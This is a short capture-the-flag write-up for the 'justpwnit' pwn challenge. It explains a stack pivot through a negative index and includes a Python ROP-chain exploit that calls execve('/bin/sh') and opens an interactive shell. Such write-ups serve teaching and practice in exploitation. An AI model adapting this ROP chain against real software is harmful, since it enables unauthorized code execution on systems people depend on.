# justpwnit

## TLDR
### Vulnerability
* stack pivot
### How to attack
* overwrite old rbp value on stack
* execute rop chain 

## Challenge
### Description
result of file command
* Arch    : x86-64
* Library : Statically linked
* Symbol  : Not stripped

result of checksec
* RELRO  : Partial RELRO
* Canary : Disable
* NX     : Enable
* PIE    : Disable

### Exploit 
We can set index to negative value.  
So we can overwrite rbp value on stack to the address which has our input, and execute rop chain.  

A part of exploit
```python
rdi_ret = 0x408989
rsi_ret = 0x4019a3
rdx_ret = 0x4085b5
rax_ret = 0x408a26
syscall = 0x4013e9
mov_ptr_rdi_rsi_ret = 0x406c3c

def exploit():
	payload = p64(0)
	payload += p64(rdi_ret)
	payload += p64(addr_bss)
	payload += p64(rsi_ret)
	payload += b"/bin/sh\x00"
	payload += p64(mov_ptr_rdi_rsi_ret)
	payload += p64(rsi_ret)
	payload += p64(0)
	payload += p64(rdx_ret)
	payload += p64(0)
	payload += p64(rax_ret)
	payload += p64(59)
	payload += p64(syscall)

	conn.sendlineafter(": ", "-2")	
	conn.sendlineafter(": ", payload)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
```

My exploit code is [solve.py](https://github.com/kam1tsur3/2021_CTF/blob/master/asis/pwn/just_pwn_it/solve.py).

## Reference

twitter: @kam1tsur3
